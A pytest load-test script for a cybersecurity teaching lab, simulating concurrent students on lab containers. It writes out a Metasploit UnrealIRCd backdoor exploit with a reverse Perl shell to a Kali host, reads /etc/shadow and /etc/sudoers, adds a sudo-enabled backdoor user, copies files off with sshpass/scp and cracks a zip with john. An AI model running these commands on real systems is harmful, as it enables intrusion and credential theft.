#!/usr/bin/env python3
"""
Load Testing Script for Cybersecurity Lab Environment

Simulates multiple students performing lab exercises concurrently to test:
- System performance under load
- Resource requirements
- Network stability
- Container isolation

Run with: python -m pytest tests/test_load.py -v -s
"""

import pytest
import subprocess
import os
import time
import threading
import random
import string
import tempfile
import csv
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Tuple, Optional, Any
import paramiko
from paramiko.ssh_exception import SSHException, AuthenticationException


class LoadTestConfig:
    """Configuration for load testing parameters"""
    
    def __init__(self, num_students: int = 3, timeout: int = 300):
        self.num_students = num_students
        self.timeout = timeout  # Overall timeout per student
        self.ssh_timeout = 30   # SSH operation timeout
        self.command_timeout = 60  # Individual command timeout
        

class StudentSimulator:
    """Simulates a single student performing lab exercises"""
    
    def __init__(self, student_id: str, student_name: str, host: str, port: int):
        self.student_id = student_id
        self.student_name = student_name
        self.host = host
        self.port = port
        self.username = "student"
        self.original_password = "student123"
        self.new_password = f"new_pass_{student_id}_{random.randint(1000, 9999)}"
        self.created_username = f"user_{student_id}_{random.randint(100, 999)}"
        self.created_password = f"pass_{random.randint(1000, 9999)}"
        self.current_password = self.original_password  # Track current password
        self.results: List[Dict[str, Any]] = []
        
    def _generate_password(self) -> str:
        """Generate a random password for this student"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        
    def _generate_username(self) -> str:
        """Generate a random username for this student"""
        return f"user_{random.randint(1000, 9999)}"
        
    def log_result(self, step: str, success: bool, duration: float, error: Optional[str] = None):
        """Log the result of a step"""
        self.results.append({
            'step': step,
            'success': success,
            'duration': duration,
            'error': error
        })
        status = "✅" if success else "❌"
        print(f"[{self.student_id}] {status} {step} ({duration:.1f}s)")
        if error:
            print(f"[{self.student_id}]    Error: {error}")
            
    def ssh_connect(self, host: Optional[str] = None, port: Optional[int] = None, username: Optional[str] = None, password: Optional[str] = None, timeout: int = 30) -> paramiko.SSHClient:
        """Establish SSH connection with retry logic"""
        # Use defaults if not provided
        host = host or self.host
        port = port or self.port
        username = username or self.username
        password = password or self.current_password
        
        for attempt in range(3):
            try:
                print(f"Attempting SSH connection to {host}:{port} as {username} (attempt {attempt + 1})")
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=port, username=username, password=password, 
                           timeout=timeout, auth_timeout=timeout, 
                           look_for_keys=False, allow_agent=False)  # Disable key-based auth
                print(f"SSH connection successful to {host}:{port}")
                return ssh
            except Exception as e:
                print(f"SSH connection attempt {attempt + 1} failed: {e}")
                if attempt < 2:
                    print(f"Retrying in 5 seconds...")
                    time.sleep(5)
                else:
                    raise Exception(f"Failed to connect after 3 attempts: {e}")
        
        # This should never be reached due to the raise above, but added for type safety
        raise Exception("Failed to establish SSH connection")
            
    def run_ssh_command(self, client: paramiko.SSHClient, command: str, 
                       input_data: Optional[str] = None, timeout: int = 60) -> Tuple[str, str, int]:
        """Run command via SSH and return stdout, stderr, exit_code"""
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            
            if input_data:
                stdin.write(input_data)
                stdin.flush()
                
            exit_code = stdout.channel.recv_exit_status()
            stdout_data = stdout.read().decode('utf-8', errors='ignore')
            stderr_data = stderr.read().decode('utf-8', errors='ignore')
            
            return stdout_data, stderr_data, exit_code
        except Exception as e:
            return "", str(e), -1

    def change_password(self, client: paramiko.SSHClient) -> bool:
        """Change the default student password using chpasswd (non-interactive)"""
        start_time = time.time()
        try:
            # Use chpasswd command which is non-interactive
            command = f'echo "student:{self.new_password}" | sudo chpasswd'
            stdout, stderr, exit_code = self.run_ssh_command(client, command, timeout=30)
            
            duration = time.time() - start_time
            
            if exit_code == 0:
                self.log_result("Change Password", True, duration)
                return True
            else:
                self.log_result("Change Password", False, duration, stderr)
                return False
                
        except Exception as e:
            duration = time.time() - start_time
            self.log_result("Change Password", False, duration, str(e))
            return False
            
    def lab_assignment_1(self) -> bool:
        """Perform Lab Assignment 1: Basic reconnaissance (Recon)"""
        try:
            # Connect with new password
            client = self.ssh_connect(password=self.new_password)
            
            # Step 1: nmap -sV scan
            start_time = time.time()
            stdout, stderr, exit_code = self.run_ssh_command(
                client, "nmap -sV ubuntu-target1", timeout=120
            )
            duration = time.time() - start_time
            
            if exit_code == 0 and "ubuntu-target1" in stdout:
                self.log_result("Nmap Service Scan", True, duration)
            else:
                self.log_result("Nmap Service Scan", False, duration, stderr)
                client.close()
                return False
                
            # Step 2: Basic nmap scan
            start_time = time.time()
            stdout, stderr, exit_code = self.run_ssh_command(
                client, "nmap ubuntu-target1", timeout=60
            )
            duration = time.time() - start_time
            
            if exit_code == 0:
                self.log_result("Nmap Basic Scan", True, duration)
                client.close()
                return True
            else:
                self.log_result("Nmap Basic Scan", False, duration, stderr)
                client.close()
                return False
                
        except Exception as e:
            self.log_result("Lab Assignment 1", False, 0, str(e))
            return False
            
    def lab_assignment_2(self) -> bool:
        """Perform Lab Assignment 2: Exploitation and persistence (Attack)"""
        try:
            client = self.ssh_connect(password=self.new_password)
            
            # Step 1: Scan IRC port
            start_time = time.time()
            stdout, stderr, exit_code = self.run_ssh_command(
                client, "nmap -p 6667 -sV ubuntu-target1", timeout=60
            )
            duration = time.time() - start_time
            
            if exit_code == 0 and "UnrealIRCd" in stdout:
                self.log_result("IRC Port Scan", True, duration)
            else:
                self.log_result("IRC Port Scan", False, duration, f"UnrealIRCd not found: {stdout}")
                client.close()
                return False
                
            # Step 2-8: Metasploit exploitation
            if not self._run_metasploit_exploit(client):
                client.close()
                return False
                
            # Step 9-11: File discovery and extraction
            if not self._perform_file_discovery(client):
                client.close()
                return False
                
            client.close()
            return True
            
        except Exception as e:
            self.log_result("Lab Assignment 2", False, 0, str(e))
            return False
            
    def _run_metasploit_exploit(self, client: paramiko.SSHClient) -> bool:
        """Run the metasploit exploitation sequence with proper timing and feedback"""
        start_time = time.time()
        
        try:
            print(f"[{self.student_id}] Starting msfconsole session...")
            
            # Start msfconsole and get an interactive channel
            channel = client.invoke_shell()
            channel.settimeout(5.0)  # Set timeout for reads
            
            # Start msfconsole
            channel.send(b"msfconsole\n")
            
            # Wait for msfconsole to start - look for ready indicators
            print(f"[{self.student_id}] Waiting for msfconsole to start...")
            buffer = ""
            start_wait = time.time()
            startup_complete = False
            
            while time.time() - start_wait < 90:  # 90 second timeout for full startup
                try:
                    data = channel.recv(1024).decode('utf-8', errors='ignore')
                    buffer += data
                    # Optional: Print startup output for debugging (uncomment if needed)
                    # if data.strip():
                    #     print(f"[{self.student_id}] msfconsole startup: {data.strip()}")
                    
                    # Look for Metasploit Framework console startup completion
                    if "Metasploit Framework console" in buffer and "msf" in buffer:
                        print(f"[{self.student_id}] ✅ msfconsole ready!")
                        time.sleep(2)  # Give it a moment to fully settle
                        break
                        
                except:
                    time.sleep(0.5)
                    continue
            else:
                print(f"[{self.student_id}] ⚠️ msfconsole didn't start properly after 90s, continuing anyway...")
            
            # Define our command sequence
            commands = [
                "use exploit/unix/irc/unreal_ircd_3281_backdoor",
                "set payload cmd/unix/reverse_perl", 
                "set RHOSTS ubuntu-target1",
                "set LHOST kali-jump",
                "run"
            ]
            
            print(f"[{self.student_id}] Sending exploit commands...")
            all_output = ""
            
            # Send each command and collect output
            for i, cmd in enumerate(commands):
                print(f"[{self.student_id}] Command {i+1}/{len(commands)}: {cmd}")
                channel.send((cmd + "\n").encode('utf-8'))
                
                # Wait for command to process and collect output
                cmd_output = ""
                cmd_start = time.time()
                
                # Longer timeout for 'run' command since it's resource-intensive under load
                timeout = 90 if cmd == "run" else 30
                
                while time.time() - cmd_start < timeout:
                    try:
                        data = channel.recv(1024).decode('utf-8', errors='ignore')
                        cmd_output += data
                        all_output += data
                        
                        # For 'run' command, wait for session or failure
                        if cmd == "run":
                            if "command shell session" in data.lower() or "session opened" in data.lower():
                                print(f"[{self.student_id}] ✅ Exploit session opened!")
                                break
                            elif "exploit failed" in data.lower() or "handler failed" in data.lower():
                                print(f"[{self.student_id}] ❌ Exploit failed!")
                                break
                        else:
                            # For other commands, wait for prompt
                            if "msf" in data and ">" in data:
                                break
                                
                    except:
                        time.sleep(0.1)
                        continue
            
            # If we got a session, try to create user
            if "command shell session" in all_output.lower() or "session opened" in all_output.lower():
                print(f"[{self.student_id}] Attempting to create user in shell...")
                
                shell_commands = [
                    # Initial reconnaissance commands
                    "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
                    "whoami",
                    "groups", 
                    "pwd",
                    "hostname",
                    "uname -a",
                    "sudo -l",
                    # User creation
                    f"sudo useradd {self.created_username}",
                    f"cat /etc/passwd | grep {self.created_username}",
                    f"cat /etc/shadow | grep {self.created_username}",
                    # Set password interactively - we'll handle this specially
                    f"sudo passwd {self.created_username}",
                    # Verify password hash is set
                    f"cat /etc/passwd | grep {self.created_username}",
                    f"cat /etc/shadow | grep {self.created_username}",
                    # Check sudo permissions (should be none initially)
                    f"sudo -u {self.created_username} sudo -l",
                    # Find sudo group (simulate student discovery)
                    "cat /etc/sudoers",
                    # Add user to sudo group
                    f"sudo usermod -aG sudo {self.created_username}",
                    # Verify group membership
                    f"groups {self.created_username}",
                    # Verify sudo permissions now work
                    f"sudo -u {self.created_username} sudo -l"
                ]
                
                for i, shell_cmd in enumerate(shell_commands):
                    channel.send((shell_cmd + "\n").encode('utf-8'))
                    
                    # Special handling for passwd command - need to send password twice
                    if shell_cmd.startswith("sudo passwd"):
                        time.sleep(3)  # Wait for password prompt
                        channel.send((self.created_password + "\n").encode('utf-8'))
                        time.sleep(1)
                        channel.send((self.created_password + "\n").encode('utf-8'))  # Confirm password
                        time.sleep(2)
                    # Special handling for sudo -u commands - need to send user's password
                    elif "sudo -u" in shell_cmd and "sudo -l" in shell_cmd:
                        time.sleep(3)  # Wait for password prompt
                        channel.send((self.created_password + "\n").encode('utf-8'))
                        time.sleep(2)
                    else:
                        time.sleep(2)
                    
                    # Collect output
                    try:
                        data = channel.recv(1024).decode('utf-8', errors='ignore')
                        all_output += data
                    except:
                        pass
            
            channel.close()
            duration = time.time() - start_time
            
            # Check for success indicators
            success_indicators = [
                "command shell session",
                "session opened",
                self.created_username
            ]
            
            output_lower = all_output.lower()
            success = any(indicator in output_lower for indicator in success_indicators)
            
            if success:
                self.log_result("Metasploit Exploit", True, duration)
                print(f"[{self.student_id}] ✅ Exploit completed successfully")
                return True
            else:
                self.log_result("Metasploit Exploit", False, duration, 
                              f"No success indicators found")
                print(f"[{self.student_id}] ⚠️ Exploit may have failed, continuing anyway")
                return True  # Continue anyway for load testing
                
        except Exception as e:
            duration = time.time() - start_time
            print(f"[{self.student_id}] ❌ Exploit failed with exception: {e}")
            self.log_result("Metasploit Exploit", False, duration, str(e))
            return False
            
    def _perform_file_discovery(self, kali_client: paramiko.SSHClient) -> bool:
        """Perform file discovery and flag extraction via SSH jump through kali-jump"""
        
        def connect_with_jump(host, user, password, gateway_client):
            """Helper to create SSH connection through jump host"""
            target_client = paramiko.SSHClient()
            target_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Create channel through the gateway (kali-jump)
            sock = gateway_client.get_transport().open_channel(
                'direct-tcpip', (host, 22), ('', 0)
            )
            
            target_client.connect(
                hostname=host,
                port=22,
                username=user,
                password=password,
                sock=sock,
                look_for_keys=False,
                allow_agent=False
            )
            return target_client
        
        try:
            print(f"[{self.student_id}] Connecting to ubuntu-target1 through kali-jump using paramiko...")
            start_time = time.time()
            
            # Connect to ubuntu-target1 through the kali-jump
            target_client = connect_with_jump(
                host='ubuntu-target1',
                user=self.created_username,
                password=self.created_password,
                gateway_client=kali_client
            )
            
            print(f"[{self.student_id}] ✅ Connected to ubuntu-target1 via jump host")
            
            # Test connection
            stdout, stderr, exit_code = self.run_ssh_command(
                target_client, "pwd && whoami", timeout=30
            )
            print(f"[{self.student_id}] Connection test: {stdout.strip()}")
            
            # File discovery
            print(f"[{self.student_id}] Searching for gnarly files...")
            stdout, stderr, exit_code = self.run_ssh_command(
                target_client, "find . -iname '*gnarly*' 2>/dev/null", timeout=60
            )
            
            print(f"[{self.student_id}] File search - Exit code: {exit_code}")
            print(f"[{self.student_id}] File search - Results: '{stdout.strip()}'")
            
            # Also try broader searches for debugging
            if not stdout.strip():
                print(f"[{self.student_id}] No gnarly files found, trying broader search...")
                
                # Search for zip files
                broad_stdout, _, _ = self.run_ssh_command(
                    target_client, "find /home -name '*.zip' 2>/dev/null", timeout=30
                )
                print(f"[{self.student_id}] Zip files found: {broad_stdout.strip()}")
                
                # List home directory contents
                home_stdout, _, _ = self.run_ssh_command(
                    target_client, "ls -la ~", timeout=30
                )
                print(f"[{self.student_id}] Home directory: {home_stdout.strip()}")
            
            duration = time.time() - start_time
            
            # Parse the output more carefully - strip quotes and extra whitespace
            raw_output = stdout.strip()
            print(f"[{self.student_id}] Raw find output: '{raw_output}'")
            
            # Find can return non-zero exit codes but still have results (due to permission errors)
            # So we check if we have output regardless of exit code
            if raw_output:
                # Remove any surrounding quotes and split by lines
                cleaned_output = raw_output.strip("'\"")
                gnarly_files = [f.strip().strip("'\"") for f in cleaned_output.split('\n') if f.strip()]
                gnarly_files = [f for f in gnarly_files if f]  # Remove empty strings
                
                print(f"[{self.student_id}] Parsed gnarly files: {gnarly_files}")
                
                if gnarly_files:
                    gnarly_file = gnarly_files[0]  # Take first found file
                    print(f"[{self.student_id}] Using gnarly file: {gnarly_file}")
                    self.log_result("File Discovery", True, duration)
                    
                    # Copy file back to Kali using SCP
                    if self._copy_and_extract_flag(kali_client, target_client, gnarly_file):
                        target_client.close()
                        return True
            
            target_client.close()
            self.log_result("File Discovery", False, duration, f"No gnarly files found")
            return False
            
        except Exception as e:
            print(f"[{self.student_id}] ❌ File discovery failed: {e}")
            self.log_result("File Discovery", False, 0, str(e))
            return False
            
    def _copy_and_extract_flag(self, kali_client: paramiko.SSHClient, target_client: paramiko.SSHClient, gnarly_file: str) -> bool:
        """Copy file from ubuntu-target1 to kali-jump using SCP"""
        
        try:
            start_time = time.time()
            
            # Create local filename for the copied file (use simple filename in home dir)
            local_filename = f"~/{gnarly_file.split('/')[-1]}"
            
            print(f"[{self.student_id}] Copying {gnarly_file} to {local_filename} on kali-jump...")
            
            # Use SCP to copy file from ubuntu-target1 to kali-jump
            # This runs ON ubuntu-target1 and pushes the file to kali-jump
            scp_command = f"sshpass -p '{self.new_password}' scp -o StrictHostKeyChecking=no {gnarly_file} student@kali-jump:{local_filename}"
            
            stdout, stderr, exit_code = self.run_ssh_command(
                target_client, scp_command, timeout=30
            )
            
            if exit_code == 0:
                duration = time.time() - start_time
                self.log_result("File Copy (SCP)", True, duration)
                
                # Verify the file was created on kali-jump
                verify_stdout, verify_stderr, verify_exit = self.run_ssh_command(
                    kali_client, f"ls -la ~/{gnarly_file.split('/')[-1]}", timeout=10
                )
                print(f"[{self.student_id}] Copied file verification: {verify_stdout.strip()}")
                
                # Extract flag from the copied file  
                copied_file_path = f"/home/student/{gnarly_file.split('/')[-1]}"
                return self._extract_flag_simulation(kali_client, copied_file_path)
            else:
                duration = time.time() - start_time
                self.log_result("File Copy (SCP)", False, duration, f"SCP failed: {stderr}")
                return False
                
        except Exception as e:
            self.log_result("File Copy (SCP)", False, 0, str(e))
            return False
            
    def _extract_flag_simulation(self, client: paramiko.SSHClient, zip_file: str) -> bool:
        """Simulate flag extraction process"""
        
        try:
            # Work with the actual copied gnarly file
            start_time = time.time()
            print(f"[{self.student_id}] Attempting to extract flag from {zip_file}")
            
            # Check if the copied file exists
            stdout, stderr, exit_code = self.run_ssh_command(
                client, f"ls -la {zip_file}", timeout=30
            )
            
            if exit_code == 0:
                # Use real zip2john and john the ripper
                print(f"[{self.student_id}] Using zip2john to extract hash...")
                
                # Extract hash using zip2john
                stdout, stderr, exit_code = self.run_ssh_command(
                    client, f"zip2john {zip_file} > /tmp/zip_hash.txt", timeout=30
                )
                
                # Check hash file content
                stdout, stderr, exit_code = self.run_ssh_command(
                    client, "cat /tmp/zip_hash.txt", timeout=30
                )
                
                if exit_code == 0 and stdout.strip():
                    # Use john the ripper with rockyou wordlist
                    print(f"[{self.student_id}] Running john the ripper with rockyou wordlist...")
                    stdout, stderr, exit_code = self.run_ssh_command(
                        client, f"john --wordlist=/usr/share/wordlists/rockyou.txt --pot=/tmp/output.txt /tmp/zip_hash.txt", timeout=120
                    )
                    
                    # Check if john found the password - use the pot file we specified
                    stdout, stderr, exit_code = self.run_ssh_command(
                        client, "john --show --pot=/tmp/output.txt /tmp/zip_hash.txt", timeout=30
                    )
                    
                    # Extract the password from john output (format: filename:password:...)
                    password_line = stdout.strip().split('\n')[0] if stdout.strip() else ""
                    cracked_password = None
                    if ":" in password_line and "password hash cracked" in stdout:
                        # John output format: filename:password:additional_fields...
                        # Split and take the second field (index 1) which is the password
                        parts = password_line.split(":")
                        if len(parts) >= 2:
                            cracked_password = parts[1]
                            print(f"[{self.student_id}] 🔓 Password cracked: {cracked_password}")
                    
                    if cracked_password:
                        # Extract the zip with the cracked password
                        stdout, stderr, exit_code = self.run_ssh_command(
                            client, f"unzip -P '{cracked_password}' {zip_file} -d /tmp/extracted 2>/dev/null", timeout=30
                        )
                        
                        if exit_code == 0:
                            # Read flag
                            stdout, stderr, exit_code = self.run_ssh_command(
                                client, "find /tmp/extracted -name '*.txt' -exec cat {} \\;", timeout=30
                            )
                            
                            if exit_code == 0 and stdout.strip():
                                duration = time.time() - start_time
                                self.log_result("Flag Extraction", True, duration)
                                print(f"[{self.student_id}] 🎉 Flag found: {stdout.strip()}")
                                return True
                            else:
                                duration = time.time() - start_time
                                self.log_result("Flag Extraction", False, duration, f"Flag not found in extracted files")
                                return True  # Continue anyway for load testing
                        else:
                            duration = time.time() - start_time
                            self.log_result("Flag Extraction", False, duration, f"Unzip failed")
                            return True  # Continue anyway for load testing
                    else:
                        duration = time.time() - start_time
                        self.log_result("Flag Extraction", False, duration, "Could not crack password")
                        return True  # Continue anyway for load testing
                else:
                    duration = time.time() - start_time
                    self.log_result("Flag Extraction", False, duration, "Hash generation failed")
                    return True  # Continue anyway for load testing
            else:
                duration = time.time() - start_time
                self.log_result("Flag Extraction", False, duration, f"Copied file not found: {zip_file}")
                return False
                
        except Exception as e:
            self.log_result("Flag Extraction", False, 0, str(e))
            return False
            
    def run_full_simulation(self) -> Dict:
        """Run the complete student simulation"""
        print(f"\n🎓 Starting simulation for {self.student_id} ({self.student_name})")
        
        start_time = time.time()
        
        try:
            # Step 1: Initial connection and password change
            client = self.ssh_connect()
            if self.change_password(client):
                # Update current password to the new one we just set
                self.current_password = self.new_password
            client.close()
            
            # Step 2: Lab Assignment 1
            if not self.lab_assignment_1():
                return self._get_results_summary(time.time() - start_time, False)
                
            # Step 3: Lab Assignment 2
            if not self.lab_assignment_2():
                return self._get_results_summary(time.time() - start_time, False)
                
            total_duration = time.time() - start_time
            print(f"🎉 {self.student_id} completed all assignments in {total_duration:.1f}s")
            
            return self._get_results_summary(total_duration, True)
            
        except Exception as e:
            total_duration = time.time() - start_time
            self.log_result("Overall Simulation", False, total_duration, str(e))
            return self._get_results_summary(total_duration, False)
            
    def _get_results_summary(self, total_duration: float, overall_success: bool) -> Dict:
        """Generate results summary"""
        successful_steps = sum(1 for r in self.results if r['success'])
        total_steps = len(self.results)
        
        return {
            'student_id': self.student_id,
            'student_name': self.student_name,
            'overall_success': overall_success,
            'total_duration': total_duration,
            'successful_steps': successful_steps,
            'total_steps': total_steps,
            'success_rate': successful_steps / total_steps if total_steps > 0 else 0,
            'results': self.results
        }


class TestLoadTesting:
    """Load testing test cases"""
    
    @pytest.fixture(autouse=True)
    def setup_and_teardown(self):
        """Setup and teardown for each test with cleanup on interruption"""
        self.project_root = os.path.dirname(os.path.dirname(__file__))
        # Import LabManager for direct function calls
        import sys
        sys.path.insert(0, self.project_root)
        from lab_manager import LabManager
        self.lab_manager = LabManager(use_sudo=True)
        self.test_csv_files = []
        
        yield
        
        # Cleanup after each test (or interruption)
        self.cleanup_test_resources()
    
    def cleanup_test_resources(self):
        """Clean up any Docker resources created during tests"""
        print("\n🧹 Cleaning up load test resources...")
        
        # Clean up CSV files
        for csv_file in getattr(self, 'test_csv_files', []):
            if os.path.exists(csv_file):
                try:
                    os.unlink(csv_file)
                    print(f"  Removed CSV file: {csv_file}")
                except Exception as e:
                    print(f"  ⚠️  Failed to remove CSV file {csv_file}: {e}")
        
        # Stop and remove any loadtest containers
        try:
            result = self.lab_manager.run_command(["docker", "ps", "-a", "--format", "{{.Names}}"])
            container_names = result.stdout.strip().split('\n') if result.stdout.strip() else []
            
            for name in container_names:
                if name and 'loadtest' in name:
                    print(f"  Removing container {name}")
                    try:
                        self.lab_manager.run_command(["docker", "rm", "-f", name])
                    except Exception as e:
                        print(f"    ⚠️  Failed to remove container {name}: {e}")
        except Exception as e:
            print(f"  ⚠️  Error listing containers: {e}")
        
        # Remove any loadtest networks
        try:
            result = self.lab_manager.run_command(["docker", "network", "ls", "--format", "{{.Name}}"])
            network_names = result.stdout.strip().split('\n') if result.stdout.strip() else []
            
            for name in network_names:
                if name and 'cyber-lab-loadtest' in name:
                    print(f"  Removing network {name}")
                    try:
                        self.lab_manager.run_command(["docker", "network", "rm", name])
                    except Exception as e:
                        print(f"    ⚠️  Failed to remove network {name}: {e}")
        except Exception as e:
            print(f"  ⚠️  Error listing networks: {e}")
        
        print("🧹 Load test cleanup completed")
    
    def setup_method(self):
        """Set up test fixtures - called by pytest automatically"""
        # Initialize lab_manager if not already done (for direct script execution)
        if not hasattr(self, 'lab_manager'):
            self.project_root = os.path.dirname(os.path.dirname(__file__))
            # Import LabManager for direct function calls
            import sys
            sys.path.insert(0, self.project_root)
            from lab_manager import LabManager
            self.lab_manager = LabManager(use_sudo=True)
            self.test_csv_files = []
        
    def create_test_students_csv(self, num_students: int) -> str:
        """Create a CSV file with test students"""
        temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.csv')
        
        writer = csv.writer(temp_file)
        writer.writerow(['student_id', 'student_name', 'port', 'subnet_id'])
        
        for i in range(num_students):
            student_id = f"loadtest{i+1:03d}"
            student_name = f"Load Test Student {i+1}"
            writer.writerow([student_id, student_name, '', ''])
            
        temp_file.close()
        
        # Track this file for cleanup
        if not hasattr(self, 'test_csv_files'):
            self.test_csv_files = []
        self.test_csv_files.append(temp_file.name)
        
        return temp_file.name
        
    def run_command(self, command: str, show_output: bool = True) -> subprocess.CompletedProcess:
        """Helper to run shell commands with optional live output"""
        if show_output:
            print(f"Running: {command}")
            # Run with live output
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                     stderr=subprocess.STDOUT, text=True, bufsize=1)
            
            output_lines = []
            if process.stdout:
                for line in iter(process.stdout.readline, ''):
                    print(line.rstrip())
                    output_lines.append(line)
            
            process.wait()
            full_output = ''.join(output_lines)
            
            return subprocess.CompletedProcess(
                args=command,
                returncode=process.returncode,
                stdout=full_output,
                stderr=""
            )
        else:
            return subprocess.run(command, shell=True, capture_output=True, text=True)
        
    @pytest.mark.integration
    def test_single_student_baseline(self):
        """Test single student performance to establish baseline"""
        self._run_load_test(1)
        
    @pytest.mark.slow
    @pytest.mark.integration
    def test_high_load_stress(self):
        """Test high load (40 students)"""
        self._run_load_test(40)
        
    def _run_load_test(self, num_students: int):
        """Run load test with specified number of students"""
        
        print(f"\n🚀 Starting load test with {num_students} students")
        
        # Create test CSV
        csv_path = self.create_test_students_csv(num_students)
        
        # Override the confirmation method to automatically accept parallel execution
        original_confirm = self.lab_manager._confirm_parallel_execution
        self.lab_manager._confirm_parallel_execution = lambda operation_name: True
        
        try:
            # Step 1: Spin up all student environments
            print(f"📚 Provisioning {num_students} student environments...")
            
            success = self.lab_manager.spin_up_class(csv_path, parallel=True)
            assert success, f"Failed to provision students"
            
            # Read updated CSV to get assigned ports
            students = self._read_student_assignments(csv_path)
            assert len(students) == num_students, "Not all students were assigned ports"
            
            # Step 2: Run simulations concurrently
            print(f"🎭 Running {num_students} concurrent student simulations...")
            
            with ThreadPoolExecutor(max_workers=num_students) as executor:
                # Start all simulations
                simulators = []
                futures = []
                
                for student_data in students:
                    simulator = StudentSimulator(
                        student_data['student_id'],
                        student_data['student_name'], 
                        "localhost",  # host
                        int(student_data['port'])
                    )
                    simulators.append(simulator)
                    future = executor.submit(simulator.run_full_simulation)
                    futures.append(future)
                
                # Collect results
                results = []
                for future in as_completed(futures, timeout=600):  # 10 minute timeout
                    try:
                        result = future.result()
                        results.append(result)
                    except Exception as e:
                        print(f"❌ Simulation failed: {e}")
                        results.append({
                            'student_id': 'unknown',
                            'overall_success': False,
                            'error': str(e)
                        })
                        
            # Step 3: Analyze results
            self._analyze_results(results, num_students)
            
        except KeyboardInterrupt:
            print("\n⚠️  Test interrupted by user (Ctrl+C)")
            raise
        except Exception as e:
            print(f"\n❌ Test failed with error: {e}")
            raise
        finally:
            # Step 4: Always clean up containers, even on interruption
            try:
                print("🧹 Cleaning up test environments...")
                self.lab_manager.spin_down_class(csv_path, parallel=True)
            except Exception as cleanup_error:
                print(f"⚠️  Warning: Cleanup failed: {cleanup_error}")
                print("   Some containers may still be running. Use 'docker ps' to check.")
            finally:
                # Restore original confirmation method
                self.lab_manager._confirm_parallel_execution = original_confirm
            
    def _read_student_assignments(self, csv_path: str) -> List[Dict]:
        """Read student assignments from CSV"""
        students = []
        with open(csv_path, 'r') as f:
            reader = csv.DictReader(f)
            for row in reader:
                if row['port']:  # Only include students with assigned ports
                    students.append(row)
        return students
        
    def _analyze_results(self, results: List[Dict], expected_count: int):
        """Analyze and report load test results"""
        
        print(f"\n📊 Load Test Results ({len(results)}/{expected_count} students)")
        print("=" * 60)
        
        successful_students = sum(1 for r in results if r.get('overall_success', False))
        total_duration = max(r.get('total_duration', 0) for r in results) if results else 0
        avg_duration = sum(r.get('total_duration', 0) for r in results) / len(results) if results else 0
        
        print(f"✅ Successful students: {successful_students}/{len(results)}")
        print(f"⏱️  Total test time: {total_duration:.1f}s")
        print(f"📈 Average completion time: {avg_duration:.1f}s")
        
        # Detailed results
        for result in results:
            student_id = result.get('student_id', 'unknown')
            success = result.get('overall_success', False)
            duration = result.get('total_duration', 0)
            success_rate = result.get('success_rate', 0)
            
            status = "✅" if success else "❌"
            print(f"{status} {student_id}: {duration:.1f}s ({success_rate:.1%} steps successful)")
            
        # Performance assertions
        assert len(results) == expected_count, f"Expected {expected_count} results, got {len(results)}"
        assert successful_students >= expected_count * 0.8, f"Less than 80% success rate: {successful_students}/{expected_count}"
        assert total_duration < 600, f"Test took too long: {total_duration:.1f}s"
        
        print(f"\n🎉 Load test passed! {successful_students}/{expected_count} students successful")


if __name__ == "__main__":
    # Allow running this test file directly for manual testing
    import sys
    
    if len(sys.argv) > 1:
        num_students = int(sys.argv[1])
    else:
        num_students = 3
        
    tester = TestLoadTesting()
    tester.setup_method()
    tester._run_load_test(num_students)